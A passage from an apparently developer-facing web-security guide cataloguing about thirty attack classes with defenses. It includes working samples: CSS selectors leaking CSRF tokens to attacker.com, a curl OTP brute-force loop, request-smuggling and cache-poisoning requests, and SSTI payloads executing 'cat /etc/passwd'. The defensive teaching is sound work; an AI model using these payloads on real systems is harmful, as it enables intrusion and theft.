const emailRegex = /^([a-zA-Z0-9])(([\-.]|[_]+)?([a-zA-Z0-9]+))*(@){1}[a-z0-9]+[.]{1}(([a-z]{2,3})|([a-z]{2,3}[.]{1}[a-z]{2,3}))$/;

// Attacker sends: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@"
// The nested groups cause exponential backtracking — the regex engine tries
// millions of combinations before failing

// Each additional 'a' doubles processing time:
// 10 chars: 2ms
// 20 chars: 50ms
// 30 chars: 8 seconds
// 40 chars: minutes — event loop blocked, server unresponsive
```

**Common vulnerable patterns:**
```
(a+)+          — nested quantifier
([a-zA-Z]+)*   — group with quantifier inside, quantifier outside
(a|aa)+        — overlapping alternatives with quantifier
(.*a){n}       — greedy dot with backtracking over a fixed number
```

**Defense:**
- Avoid nested quantifiers and overlapping alternatives.
- Use linear-time regex engines: `re2` (Node.js), Rust's `regex` crate, Go's `regexp` (RE2-based).
- Set a timeout on regex execution — `regexp-timeout` in Node.js or `timeout` in Python's `regex`.
- Use simple, well-tested validation libraries instead of custom regex: `validator.js`, `zod`, `email-validator`.
- Test your regexes with `rxxr`, `regex101`, or `safe-regex` before deploying.

---

### 12. Session Fixation

An attacker tricks a victim into using a session ID known to the attacker. After the victim authenticates, the attacker uses the same session ID to access the victim's account.

```
1. Attacker visits yourapp.com/login — server sets session cookie: session=abc123
2. Attacker sends victim a link: https://yourapp.com/login?session=abc123
   (Or tricks the browser into using the attacker's cookie via MITM on HTTP)
3. Victim clicks the link, logs in with their credentials
4. Server associates session abc123 with the victim's authenticated identity
5. Attacker uses session abc123 — now logged in as the victim
```

**Defense:**
- Regenerate the session ID after every privilege level change: login, logout, role change.
- Invalidate the old session ID server-side after regeneration.
- Set session cookies with `HttpOnly`, `Secure`, and `SameSite=Strict`.
- Use framework session management that handles this automatically (Laravel, Express-session with `regenerate`, NextAuth/Auth.js).

---

### 13. Email Header Injection

When user input is placed into email headers without sanitization, attackers can inject additional recipients (CC, BCC), modify the subject, or add arbitrary headers.

```php
// VULNERABLE: contact form
$to = "support@yourapp.com";
$subject = "Contact from: " . $_POST['name'];
$body = $_POST['message'];
$headers = "From: " . $_POST['email'];
mail($to, $subject, $body, $headers);

// Attacker submits:
// email: noreply@yourapp.com\r\nBcc: victim1@evil.com, victim2@evil.com
// The injected CC/BCC sends the email to the attacker's addresses

// Attacker submits:
// email: noreply@yourapp.com\r\nContent-Type: text/html\r\n\r\n<script>...</script>
// Converts the plain-text email to HTML with injected script
```

**Defense:**
- Strip `\r` and `\n` from any user input used in email headers.
- Use email libraries that handle header sanitization: Nodemailer, Resend SDK, Postmark, SendGrid, Mailgun.
- Validate email addresses with a proper parser, not a regex.
- Never pass raw user input to the `$headers` parameter of PHP's `mail()` function.

---

### 14. DOM Clobbering

An attacker injects HTML elements with `id` or `name` attributes that shadow global JavaScript variables, breaking application logic or bypassing security checks.

```html
<!-- Application code relies on a global config variable: -->
<script>
  if (window.config.isAdmin) {
    // Grant admin access
  }
</script>

<!-- Attacker injects (via stored HTML, not sanitized): -->
<form id="config">
  <input name="isAdmin" value="true">
</form>

<!-- Now window.config refers to the <form> element, not the config object -->
<!-- window.config.isAdmin returns the <input> element, which is truthy -->
<!-- Admin access granted -->
```

```html
<!-- Clobbering document.getElementById to return attacker-controlled elements -->
<img id="getElementById" name="someMethod">
<!-- document.getElementById now returns this image element object -->
```

**Defense:**
- Do not rely on global variables that could be shadowed by DOM elements.
- Use `window.config` only if config is defined with `let` or `const` (block-scoped, not clobberable).
- Use strict mode (`"use strict"`) — catches accidental global assignments.
- Sanitize user-supplied HTML — remove or rename `id` and `name` attributes that collide with known globals.
- CSP `script-src` does NOT prevent DOM clobbering — it's a DOM manipulation attack, not script injection.

---


### 15. Type Juggling / Loose Comparison Attacks

Languages with weak typing (PHP, JavaScript) perform automatic type coercion in comparisons. Attackers exploit this to bypass authentication, authorization, and validation checks.

**PHP type juggling:**

```php
// PHP loose comparison (==) converts types before comparing
"admin" == 0        // true — string "admin" is coerced to integer 0
"0e12345" == "0e67890"  // true — both are scientific notation (0^X = 0)
"a" == true         // true — non-empty string coerced to true
null == false        // true
0 == false           // true
```

```php
// AUTH BYPASS: Cookie remember_token=0
// SELECT * FROM users WHERE remember_token = 0
// MySQL treats 0 as falsy; returns the first row if no valid token matches

// PASSWORD HASH BYPASS — magic hashes:
$storedHash = '$2y$10$...'; // bcrypt hash starts with $2y
$userInput = '0e123456789'; // Magic hash — evaluates to 0 in scientific notation
if ($storedHash == $userInput) {
    // login(); — AUTHENTICATED
    // bcrypt hash starts with $2y$, PHP coerces to 0
    // '0e123456789' also coerces to 0 in numeric context -> MATCH
}
```

**JavaScript type coercion:**

```javascript
// Loose equality is not transitive:
[] == 0      // true
"0" == 0     // true
[] == "0"    // false — WAT

// JSON parse + loose comparison:
const role = JSON.parse(req.body.role); // Attacker sends: 0
if (!role) { // 0 is falsy — bypasses required role check
    // grant access
}
```

**Defense:**
- Use strict comparison: `===` (PHP, JS), `is` (Python), `.equals()` (Java).
- In PHP: `declare(strict_types=1)`. Always use `===`. Never `==`.
- Use `hash_equals()` for comparing hashes, tokens, HMACs — timing-safe and type-safe.
- In JavaScript: `===` exclusively. For object comparisons, `Object.is()` or deep equality.
- Explicit type casting at input boundaries: `$id = (int) $_GET['id'];`

---

### 16. HTTP Parameter Pollution

Duplicate HTTP parameters resolve differently across frameworks — some take the first, some the last, some concatenate. Attackers exploit this to bypass security checks.

```http
POST /transfer HTTP/1.1
amount=100&amount=1

# Express (Node.js): req.body.amount = ['100', '1']
# PHP: $_POST['amount'] = '1' (last value wins)
# Java Servlet: getParameter('amount') = '100' (first value wins)
# ASP.NET: Request['amount'] = '100,1' (comma-separated)
```

**WAF bypass via parameter pollution:**

```http
GET /search?q=SELECT&q=*&q=FROM&q=users HTTP/1.1
# WAF sees: q = 'SELECT' — not dangerous, single keyword
# Backend concatenates: q = 'SELECT * FROM users' — SQLi executed
```

**OAuth redirect_uri pollution:**

```http
GET /authorize?redirect_uri=https://legit.com&redirect_uri=https://evil.com
# OAuth server validates the first URI...
# ...but uses the last one for the actual redirect
# Result: authorization code delivered to attacker
```

**Defense:**
- Reject requests with duplicate parameters — return 400 Bad Request.
- Use parameter parsers that throw on duplicates: `qs` with `{ allowDuplicates: false }`.
- Validate parameters after parsing, not before — the WAF may see a different value than the app.

---

### 17. Timing Attacks / Blind Data Exfiltration

When response time varies based on a secret value, attackers extract it character-by-character. Targets: API keys, password reset tokens, HMAC comparisons, database queries.

```javascript
// VULNERABLE: early return on first character mismatch
function verifyToken(userToken, storedToken) {
  for (let i = 0; i < storedToken.length; i++) {
    if (userToken[i] !== storedToken[i]) return false; // EARLY RETURN
  }
  return true;
}

// Attacker sends tokens, measures response time:
// AAAAAAAAAAAAAAA -> 2ms (first char wrong, immediate fail)
// xAAAAAAAAAAAAAA -> 5ms (first char correct, check continues)
// Attacker now knows first char is 'x'. Repeat for each position.
// Full 32-char token extracted in ~256 * 32 = 8,192 requests.
```

```sql
-- SQL timing attack — blind data extraction:
SELECT * FROM users WHERE id = 1
  AND IF(SUBSTRING(password,1,1)='a', SLEEP(0.1), 0)
-- Response delayed 100ms means first char is 'a'
-- Repeat 256 times per character position
```

**Defense:**
- Constant-time comparison: `crypto.timingSafeEqual()` (Node.js), `hash_equals()` (PHP), `hmac.compare_digest()` (Python).
- Rate limit endpoints that perform secret comparisons.
- Add random jitter (0-50ms) to responses — not a fix, but raises the noise floor.
- Never perform early-return string comparison on tokens, HMACs, or password hashes.

---

### 18. Tabnabbing / Reverse Tabnabbing

When your page links to an external site with `target="_blank"`, the opened page has `window.opener` access — it can redirect your tab to a phishing page that looks like your login screen.

```html
<!-- Your page -->
<a href="https://external-site.com" target="_blank">External Link</a>

<!-- external-site.com runs: -->
<script>
  if (window.opener) {
    // Redirect YOUR tab to a phishing page
    window.opener.location = 'https://yourapp-phishing.com/login';
    // User tabs back — sees familiar login form, enters credentials
    // Attacker harvests them
  }
</script>
```

**Defense:**
- Add `rel="noopener noreferrer"` to every `target="_blank"` link.
- Set `Cross-Origin-Opener-Policy: same-origin` header — blocks `window.opener` from cross-origin pages.
- Use a linter: `eslint-plugin-react` `react/jsx-no-target-blank`, Angular auto-adds `noopener`.

---

### 19. CSS Injection / Data Exfiltration

Even without JavaScript, injected CSS can steal page content — CSRF tokens, passwords, private messages — using attribute selectors and `background: url()`.

```css
/* Attacker injects this CSS (via stored HTML in a bio or comment) */

/* Extract CSRF token character by character */
input[name="csrf_token"][value^="a"] {
  background: url('https://attacker.com/steal?starts_with=a');
}
input[name="csrf_token"][value^="b"] {
  background: url('https://attacker.com/steal?starts_with=b');
}
/* 62 selectors per character position */
/* Browser renders the page -> issues request for the matching background URL */
/* Attacker's server log: GET /steal?starts_with=x -> first char is 'x' */
/* Repeat for position 2: [value^="xa"], [value^="xb"], ... */
/* Full token extracted character by character */
```

```css
/* Steal typed password in real-time */
input[type="password"][value$="a"] {
  background: url('https://attacker.com/steal?ends_with=a');
}
/* Each keystroke triggers the matching selector — browser sends request */
```

**Defense:**
- Strict CSP: `style-src 'self'` — blocks inline CSS injection.
- For user-generated content requiring styling, use a CSS sanitizer allowlist.
- Never render raw user input inside `<style>` tags or `style` attributes.
- `HttpOnly` cookies — CSS cannot extract them even with successful injection.

---

### 20. Mass Assignment

When an API or ORM binds an entire request body to a database model without filtering fields, attackers set privileged attributes: `isAdmin`, `role`, `balance`, `verifiedEmail`.

```typescript
// VULNERABLE — any field in req.body gets saved
app.post('/api/users', async (req, res) => {
  const user = await prisma.user.create({ data: req.body });
  // Attacker sends: { "name": "test", "email": "test@evil.com", "role": "admin" }
  res.json(user);
});

// Same vulnerability in every ORM:
User.create(req.body);                          // Sequelize
DB::table('users')->insert($request->all());     // Laravel
new User(req.body).save();                      // Mongoose
```

```python
# Python/FastAPI — Pydantic with extra='allow' or extra='ignore':
class UserCreate(BaseModel):
    name: str
    email: str
    model_config = ConfigDict(extra='ignore') # Silently accepts and ignores 'role': 'admin'?
    # Actually 'ignore' strips unknown fields — 'allow' keeps them — 'forbid' rejects
```

**Defense:**
- Define explicit allowlists for writable fields — never spread `req.body` or `$request->all()`.
- Prisma: `data: { name: req.body.name, email: req.body.email }` — explicit fields only.
- Laravel: `$fillable` on models, `$request->validated()` or `$request->only([...])`.
- Django: `ModelForm` with `fields` explicitly listed.
- Pydantic: `model_config = ConfigDict(extra='forbid')` — reject unknown fields.

---

### 21. Brute Force on API Tokens, OTPs, and Reset Codes

Rate limiting on `/login` is common. Attackers also brute-force password reset tokens (often 6-digit numeric), OTP codes (4-6 digits), magic links (token in URL), and short-lived API tokens.

```bash
# Brute-force a 6-digit OTP (1,000,000 combinations)
for i in $(seq 0 999999); do
  code=$(printf "%06d" $i)
  curl -s -o /dev/null -w "$code %{http_code}\n" \
    "https://yourapp.com/api/verify-otp" \
    -d "email=victim@email.com&code=$code" &
done
# At 100 req/s: ~3 hours. Distributed across 10 IPs: ~17 minutes.
# Target window: OTP often valid for 5-10 minutes — achievable with parallelism.
```

**Defense:**
- Separate rate limit for token/OTP verification: 3 attempts per token, then invalidate it.
- Use longer tokens: 32+ character hex strings, not 6-digit numbers.
- Bind tokens to the session/device that requested them — token from IP A must not work from IP B.
- Implement exponential backoff + permanent lockout after N total failed attempts.
- Prefer TOTP over SMS/email OTPs — TOTP is not vulnerable to network brute-force.

---

### 22. Hash Length Extension Attack

When a MAC is `HASH(secret + message)` using MD5, SHA-1, or SHA-256, an attacker who knows `message` and its signature can compute `HASH(secret + message + padding + evil_data)` without knowing the secret.

```
VULNERABLE:  signature = SHA256(secret + "file=report.pdf")
URL:          /download?file=report.pdf&signature=abc123...

Attacker uses hash extender tool:
  Input:  data="file=report.pdf", signature="abc123...", secret_len=16
  Append: "&admin=true"
  Output: new_data="file=report.pdf\x80\x00...&admin=true"
          new_signature=valid_for_new_data

Attacker sends: /download?file=report.pdf%80%00...%26admin%3Dtrue&signature=NEW
Server validates: SHA256(secret + new_data) == new_signature -> TRUE
Attacker gets admin access without knowing the secret.
```

**Affected:** MD5, SHA-1, SHA-256, SHA-512. **Not affected:** HMAC, SHA-3, BLAKE2, BLAKE3.

**Defense:**
- Use HMAC instead of raw `HASH(secret + message)`:
  ```javascript
  const hmac = crypto.createHmac('sha256', secret).update(data).digest('hex');
  ```
- Or use SHA-3 / BLAKE2 — not vulnerable to length extension by design.

---

### 23. Unicode Normalization / Homoglyph Attacks

Different Unicode representations of the same visual character bypass security checks. `admin` (ASCII) and `аdmin` (Cyrillic 'а') look identical but are different strings.

```
Visual lookalikes:
  admin  vs  admｉn  (the 'i' is fullwidth U+FF49)
  admin  vs  аdmin  (the 'a' is Cyrillic U+0430)
  gmail  vs  gmaіl  (the 'i' is Cyrillic U+0456)

Impact chain:
  - Phishing domains: yourapp.com vs yourapp.com (Cyrillic 'а')
  - Username impersonation: register as admｉn, appear as admin in chat/support
  - Filter bypass: WAF blocks "SELECT", attacker sends "SELEСT" (Cyrillic 'С')
  - Path traversal: "../etc/passwd" where dots are fullwidth — bypass naive ../ filter
```

**SQL filter bypass:**

```sql
-- WAF blocks: SELECT, UNION
-- Attacker sends: ＳＥＬＥＣＴ (fullwidth characters)
-- Application normalizes to: SELECT
-- Normalization happens AFTER WAF check -> SQLi executed
```

**Defense:**
- Normalize input to canonical form BEFORE security checks: `input.normalize('NFKC')`.
- Then apply auth, validation, and filtering on the normalized string.
- For identifiers: restrict charset to `[a-zA-Z0-9_-]+` — reject anything outside ASCII.
- For international domains: browsers natively protect the URL bar; application code needs explicit normalization.

---


### 24. Credential Stuffing

Attackers use massive lists of email/password pairs from previous data breaches to attempt logins on your application. Tools like OpenBullet and SilverBullet automate this at scale.

**Defense:**
- Hard rate limiting on `/login` — 5 attempts per minute per IP and per account
- Check passwords against Have I Been Pwned at registration and password change
- Require MFA for all users — TOTP as a minimum; phishing-resistant passkeys as the goal
- Monitor for anomalous login patterns (geo-velocity, impossible travel, new device/browser)

### 25. IDOR (Insecure Direct Object Reference)

The most common API vulnerability. When `/api/orders/42` returns data without verifying that the authenticated user owns order 42.

```typescript
// VULNERABLE
export async function GET(req: Request, { params }: { params: { id: string } }) {
  return db.order.findUnique({ where: { id: params.id } });
}

// FIXED
export async function GET(req: Request, { params }: { params: { id: string } }) {
  const session = await getSession();
  if (!session) return Response.json({ error: "Unauthorized" }, { status: 401 });

  const order = await db.order.findUnique({ where: { id: params.id } });
  if (!order) return Response.json({ error: "Not found" }, { status: 404 });
  if (order.userId !== session.user.id) {
    return Response.json({ error: "Forbidden" }, { status: 403 });
  }
  return Response.json(order);
}
```

**Pattern:** Every resource access should follow this pattern: authenticate, fetch, verify ownership, then return. Never skip the ownership check.

### 26. SSRF (Server-Side Request Forgery)

Any feature where your server fetches a URL provided by a user — webhook configuration, profile image URL, link unfurling, import-from-URL — is an SSRF vector. Attackers can reach internal services, cloud metadata endpoints (`169.254.169.254` on AWS/GCP/Azure), and internal APIs.

```typescript
// VULNERABLE
const response = await fetch(req.body.url);
// Attacker sends: http://169.254.169.254/latest/meta-data/iam/security-credentials/

// MITIGATION
const ALLOWED_HOSTS = ["avatars.githubusercontent.com", "lh3.googleusercontent.com"];
const url = new URL(req.body.url);

if (url.protocol !== "https:") throw new Error("Only HTTPS allowed");
if (!ALLOWED_HOSTS.includes(url.hostname)) throw new Error("Disallowed host");

// Resolve DNS and check for private IPs
const addresses = await dns.resolve4(url.hostname);
for (const addr of addresses) {
  if (isPrivateIP(addr)) throw new Error("Private IP not allowed");
}

const response = await fetch(url.toString());
```

### 27. JWT Attacks

| Attack | How It Works | Defense |
|--------|-------------|---------|
| `alg:none` | Attacker sets `{"alg":"none"}` in the JWT header — some libraries skip verification entirely | Always explicitly specify accepted algorithms: `algorithms: ["ES256"]` |
| HMAC with public key | Server uses RSA but also accepts HS256. Attacker signs a forged token with the *public* key as the HMAC secret | Only accept the algorithm you configured; never mix RS256 and HS256 |
| `kid` injection | `{"kid":"/etc/passwd"}` — some libraries read the file at the `kid` path | Validate or ignore `kid`. Use fixed key IDs from your JWKS endpoint |
| JWKS spoofing | Attacker hosts their own JWKS and sets the `jku` header to point to it | Validate `jku` against an allowlist of trusted JWKS URLs, or use embedded keys |

```typescript
import { jwtVerify } from "jose";

const { payload } = await jwtVerify(token, publicKey, {
  algorithms: ["ES256"],  // Explicit — never accept a mixed list
  issuer: "https://auth.yourapp.com",
  audience: "https://api.yourapp.com",
  clockTolerance: 30,     // 30 seconds of clock skew tolerance
});
```

### 28. File Upload Attacks

```typescript
async function handleUpload(file: File, userId: string) {
  // 1. Size limit
  if (file.size > 5 * 1024 * 1024) throw new Error("File too large");

  // 2. MIME type check
  const ALLOWED_MIME = ["image/jpeg", "image/png", "image/webp", "application/pdf"];
  if (!ALLOWED_MIME.includes(file.type)) throw new Error("Invalid type");

  // 3. Magic bytes verification (content-based, not header-based)
  const buffer = Buffer.from(await file.arrayBuffer());
  const magic = buffer.subarray(0, 4).toString("hex");
  const ALLOWED_MAGIC: Record<string, string[]> = {
    "image/jpeg":         ["ffd8ffe0", "ffd8ffe1", "ffd8ffe2"],
    "image/png":          ["89504e47"],
    "image/webp":         ["52494646"], // RIFF header
    "application/pdf":    ["25504446"], // %PDF
  };
  const expectedMagics = ALLOWED_MAGIC[file.type];
  if (!expectedMagics?.some(m => magic.startsWith(m))) {
    throw new Error("File content does not match declared type");
  }

  // 4. Random filename — prevents path traversal and overwrite attacks
  const extension = file.type.split("/")[1];
  const safeName = `${crypto.randomUUID()}.${extension}`;

  // 5. Store outside webroot (S3, Supabase Storage, R2) — never on the app server filesystem
  // 6. Scan for malware (ClamAV or Cloud Storage scanning) if accepting uploads from untrusted users
}
```

### 29. Environment Variable and Secret Leaks

```bash
# Common leak vectors (check all of these):
# 1. .env files committed to git — add .env* to .gitignore
# 2. Vercel preview deployments inheriting production environment variables
# 3. Next.js — NEXT_PUBLIC_ prefix inlines the value into the client bundle
# 4. Production source maps exposing server code and inline secrets
# 5. CI/CD logs printing environment variables (debug echo statements)
# 6. Error tracking tools (Sentry, LogRocket) capturing env vars in breadcrumbs
# 7. Docker images with build-time ARGs that become ENV and persist in image layers

# Scan before every push:
gitleaks detect --source . --verbose
trufflehog filesystem . --no-update
```

### 30. Open Redirect

If your application redirects users based on a query parameter, attackers can use your domain to phish — the URL starts with `yourapp.com` but lands on `evil.com`.

```typescript
// VULNERABLE
// GET /api/redirect?to=https://evil.com
return NextResponse.redirect(req.nextUrl.searchParams.get("to")!);

// FIXED — allowlist or relative-only
const DEFAULT_REDIRECT = "/dashboard";
const ALLOWED_PATHS = ["/dashboard", "/settings", "/billing"];

const to = req.nextUrl.searchParams.get("to") ?? DEFAULT_REDIRECT;
const url = new URL(to, "https://yourapp.com");

// Only allow same-origin redirects
if (url.origin !== "https://yourapp.com") {
  return NextResponse.redirect(new URL(DEFAULT_REDIRECT, req.url));
}

return NextResponse.redirect(url);
```

### 31. Webhook Forgery

Any unverified webhook endpoint is an open door. An attacker can POST arbitrary payloads and trigger side effects — granting themselves premium access, triggering password resets, or creating fraudulent orders.

```typescript
// Always verify webhook signatures
// Stripe, Clerk, GitHub, Resend, Svix — all provide signing secrets
// Use their official SDK methods to constructEvent / verifyWebhookSignature
// Never trust an unsigned webhook payload
```

### 32. GraphQL Batching and Alias Attacks

A single HTTP POST to `/graphql` can contain hundreds of aliased queries:

```graphql
query {
  a1: user(id: 1) { email }
  a2: user(id: 2) { email }
  # ... 100 more aliases
}
```

This bypasses traditional rate limiting (it's one HTTP request) and can brute-force IDs, enumerate users, or cause denial of service through deeply nested queries.

**Defense:**
- Limit query depth (max 5-7 levels) with `graphql-depth-limit` or `@envelop/depth-limit`
- Implement query cost analysis — each field has a cost; reject queries exceeding a budget
- Use persisted queries in production — only allow pre-registered, server-known operations
- Limit the number of aliases allowed per request

---

## Advanced Attack Catalog

These are the techniques professional red teams and APT groups use against modern web applications. Each has been observed in real breaches with assigned CVEs. This section assumes you already understand the basics from the section above.

---

### 1. HTTP Request Smuggling

**Difficulty:** Expert | **Impact:** Full request hijacking, cache poisoning, credential theft, admin panel bypass

Request smuggling exploits parsing differences between front-end proxies (Vercel Edge, Cloudflare, AWS ALB, NGINX, Envoy) and back-end servers (Node.js `http`, Go `net/http`, uvicorn, Gunicorn). The attacker crafts an ambiguous HTTP request that one parser interprets as one boundary and the other parser interprets differently — causing a "smuggled" request to be prepended to the next legitimate user's request.

**CL.TE variant (Content-Length on front, Transfer-Encoding on back):**

```http
POST / HTTP/1.1
Host: yourapp.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: yourapp.com
```

The front-end reads exactly 13 bytes (the `0\r\n\r\nGET /admin...`), forwards the entire payload as one request body. But the back-end sees `Transfer-Encoding: chunked`, reads the `0` terminator as end-of-body, and treats `GET /admin HTTP/1.1` as a brand new smuggled request — arriving without authentication cookies or headers.

**TE.CL variant (Transfer-Encoding on front, Content-Length on back):**

```http
POST / HTTP/1.1
Host: yourapp.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Host: yourapp.com
Content-Length: 44

0

```

Front-end parses chunked, reads `5c` (92 bytes) as one chunk. Back-end reads `Content-Length: 4` and processes only the first 4 bytes (`5c\r\n`). Everything after — `GPOST / HTTP/1.1...` — is left in the buffer and becomes the prefix of the next legitimate request. That G was intentionally prepended to corrupt the next real `POST` into `GPOST`, which the server ignores, and the smuggled body becomes the next request.

**TE.TE obfuscation (both parsers support chunked, but disagree on which header to use):**

```http
Transfer-Encoding: chunked
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: [0x0b]chunked
```

One parser normalizes whitespace/prefixes and falls back to Content-Length. The other picks a different `Transfer-Encoding` header. Result: desync.

**HTTP/2 downgrade smuggling (H2C):**

When a CDN accepts HTTP/2 from the client but speaks HTTP/1.1 to the origin, the downgrade process can introduce smuggling if the H2-to-H1.1 translation is not RFC-compliant. CVE-2023-44487 (Rapid Reset) exploited H2 stream cancellation for DDoS; smuggling variants weaponize the same conversion logic.

**Real-world CVEs:**
- CVE-2022-23943: Apache HTTP Server mod_proxy
- CVE-2023-25690: Apache mod_proxy H2 smuggling
- CVE-2024-27919: Envoy proxy oghttp2 codec
- CVE-2021-22925: HAProxy H2 smuggling

**Detection:**

```bash
# Burp Suite HTTP Request Smuggler extension
# Manual detection with time-based techniques:
# 1. Send a CL.TE probe that creates a request the back-end times out on
# 2. Immediately send a normal request
# 3. If it also times out, the probe poisoned the connection — smuggling confirmed

# Automated scanner:
python3 smuggler.py -u https://yourapp.com -m CL.TE
```

**Defense:**
- Use **HTTP/2 (or HTTP/3) end-to-end** — no downgrade, no parsing ambiguity. H2 frames are binary and length-prefixed.
- If HTTP/1.1 to the origin is unavoidable, use the same HTTP parser on both sides (e.g., NGINX front + NGINX back, or Envoy + Envoy)
- Reject requests containing both `Content-Length` and `Transfer-Encoding` (HTTP spec says CL must be ignored when TE is present — reject ambiguity entirely)
- Enable WAF smuggling rules (Cloudflare Managed Ruleset includes TE/CL smuggling detection)

---

### 2. Race Condition / TOCTOU (Time-of-Check to Time-of-Use)

**Difficulty:** Advanced | **Impact:** Double-spend currency, infinite coupon redemption, privilege escalation, concurrent limit bypass

Race conditions exploit the gap between a security check and the operation that depends on it. Under high concurrency, multiple requests pass the check simultaneously before any of them complete the operation.

**Classic coupon abuse:**

```php
// VULNERABLE — check and increment are two separate operations
$coupon = Coupon::where('code', $request->code)->first();

// CHECK — attacker sends 50 parallel requests here
if ($coupon->used_count >= $coupon->max_uses) {
    abort(400, 'Coupon exhausted');
}
// All 50 threads see used_count = 0

// USE — all 50 threads increment
$coupon->increment('used_count');
// Result: coupon applied 50 times despite max_uses=1
```

**Gift card / wallet double-spend:**

```typescript
// VULNERABLE — even with a transaction, read-then-write races are possible
async function redeemCode(userId: string, code: string) {
  return await db.$transaction(async (tx) => {
    const card = await tx.giftCard.findFirst({ where: { code } });

    // 20 parallel requests all pass this check
    if (!card || card.redeemedAt !== null) {
      throw new Error("Already redeemed");
    }

    // 20 parallel updates — last one wins, but all credit the balance
    await tx.giftCard.update({
      where: { code },
      data: { redeemedAt: new Date(), redeemedBy: userId },
    });

    await tx.user.update({
      where: { id: userId },
      data: { balance: { increment: card.amount } },
    });
  });
}
```

Even inside a Prisma transaction, `findFirst` acquires a shared lock, not exclusive. Under PostgreSQL's default READ COMMITTED isolation, multiple transactions can simultaneously read `redeemedAt = null` and all proceed.

**Defense — pessimistic locking:**

```sql
-- PostgreSQL: lock the row for update BEFORE reading
BEGIN;
SELECT * FROM gift_cards WHERE code = 'ABC123' FOR UPDATE;
-- Now no other transaction can read or modify this row
-- Check redeemedAt, update if valid, COMMIT

-- Or use a conditional UPDATE with RETURNING:
UPDATE gift_cards
SET redeemed_at = NOW(), redeemed_by = $1
WHERE code = 'ABC123' AND redeemed_at IS NULL
RETURNING *;
-- If 0 rows returned, the code was already used
```

```typescript
// SAFE — single atomic UPDATE, check the result
const result = await db.giftCard.updateMany({
  where: { code, redeemedAt: null },
  data: { redeemedAt: new Date(), redeemedBy: userId },
});

if (result.count === 0) {
  throw new Error("Already redeemed or invalid");
}
// Only one request ever gets count > 0; the database serializes UPDATEs on the same row
```

**Advanced: multi-endpoint race conditions**

The most dangerous race conditions span multiple endpoints. For example:
- `POST /checkout` validates cart at $0 and creates an unpaid order
- `POST /apply-coupon` applies a 100% discount to the pending order
- `GET /confirm-order` finalizes the order

An attacker sends `/checkout` and `/apply-coupon` simultaneously — the coupon attaches between validation and confirmation.

**Defense pattern:** Use **idempotency keys** and **state machine guards**. An order must be in `PENDING_VALIDATION` state before a coupon can be applied, and must transition to `VALIDATED` before confirmation. PostgreSQL advisory locks or Redis distributed locks (`redlock`) serialize the state transitions.

---

### 3. Web Cache Poisoning & Cache Deception

**Difficulty:** Advanced | **Impact:** Stored XSS for every visitor, sensitive page caching, DoS

Cache poisoning tricks a CDN or proxy cache into storing a malicious version of a page, which is then served to every subsequent visitor. Cache deception tricks the cache into storing a sensitive, authenticated page at a publicly cacheable URL.

**Cache poisoning via unkeyed headers:**

Most caches key on the URL path and `Host` header. Everything else — `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Original-URL`, `Forwarded` — is ignored for cache lookups but may be reflected in the response.

```http
GET /en HTTP/1.1
Host: yourapp.com
X-Forwarded-Host: evil.com

HTTP/1.1 200 OK
<meta property="og:url" content="https://evil.com/en">
<script src="https://evil.com/payload.js"></script>
```

The cache stores this response under key `yourapp.com/en`. Every subsequent visitor to `https://yourapp.com/en` receives the poisoned response with `evil.com` scripts. The attacker only needed to send one request to poison the cache for everyone.

**Common unkeyed injection points:**
- `X-Forwarded-Host` -> reflected in redirect URLs, canonical links, script src
- `X-Forwarded-Scheme` -> reflected in redirects (HTTP vs HTTPS)
- `X-Original-URL` -> some back-ends use this for routing but caches ignore it
- `Origin` / `Referer` -> sometimes reflected in error pages or debug output
- Cookie values -> if the cache ignores cookies (common optimization), any cookie-driven response variation can be poisoned

**Cache deception:**

```http
GET /account/settings HTTP/1.1
Host: yourapp.com
Cookie: session=abc123

HTTP/1.1 200 OK
Cache-Control: public, max-age=3600
Content-Type: text/html
... [user's billing address, email, API keys] ...
```

If the CDN is configured to cache `.css`, `.js`, and `.png` but the backend serves `/account/settings` as HTML, an attacker appends a fake extension:

```http
GET /account/settings/nonexistent.css HTTP/1.1
Host: yourapp.com
Cookie: session=attacker-cookie
```

The backend ignores the fake path segment and returns the full settings page. The CDN sees `.css` and caches it at `/account/settings/nonexistent.css`. The attacker now visits that URL without auth cookies and retrieves the cached, authenticated page.

**Defense:**
- Set `Vary: Cookie, Authorization` on all authenticated responses — forces the cache to key on the cookie value
- Disable caching on authenticated pages entirely with `Cache-Control: no-store, private`
- Use static file extensions only for actual static files — never let `/settings/nonexistent.css` return HTML
- Never reflect unkeyed headers in response bodies without sanitization. If you must reflect `X-Forwarded-Host`, validate it against an allowlist first.
- Use `Cache-Control: no-cache` (revalidate) and `s-maxage=0` for CDN-internal caches

---

### 4. Server-Side Template Injection (SSTI) with Sandbox Escape

**Difficulty:** Expert | **Impact:** Remote Code Execution (RCE)

SSTI occurs when user input is concatenated into a template string before rendering. The template engine interprets user-supplied expressions as code. Sandbox escapes then leverage the template engine's internal objects to break out and execute arbitrary system commands.

**Detection:**

```
Input: {{7*7}}         -> Output: 49         -> SSTI confirmed (Jinja2, Twig, Mustache)
Input: ${7*7}          -> Output: 49         -> SSTI confirmed (Freemarker, Velocity)
Input: <%= 7*7 %>      -> Output: 49         -> SSTI confirmed (ERB, EJS)
Input: #{7*7}          -> Output: 49         -> SSTI confirmed (Pug)
```

**Jinja2 (Python/Flask) sandbox escape to RCE:**

```python
# Step 1: Access Python's object introspection chain
{{ ''.__class__.__mro__[1].__subclasses__() }}
# Lists every class loaded in the Python runtime

# Step 2: Find subprocess.Popen in the class list (typically index ~250-260)
{{ ''.__class__.__mro__[1].__subclasses__()[258] }}

# Step 3: Call Popen to execute arbitrary commands
{{ ''.__class__.__mro__[1].__subclasses__()[258]('cat /etc/passwd', shell=True, stdout=-1).communicate()[0] }}
```

**Twig (PHP/Symfony) sandbox escape:**

```twig
{{ _self.env.registerUndefinedFilterCallback('exec') }}
{{ _self.env.getFilter('id') }}
```

**Freemarker (Java) sandbox escape:**

```freemarker
${ "freemarker.template.utility.Execute"?new()("id") }
```

**Node.js EJS RCE (CVE-2022-29078):**

```javascript
// If user input reaches the options object passed to ejs.render()
const userInput = req.query.name;
res.render('profile', { name: userInput });

// Attacker crafts:
// ?name=<%= global.process.mainModule.require('child_process').execSync('id') %>
```

**Defense:**
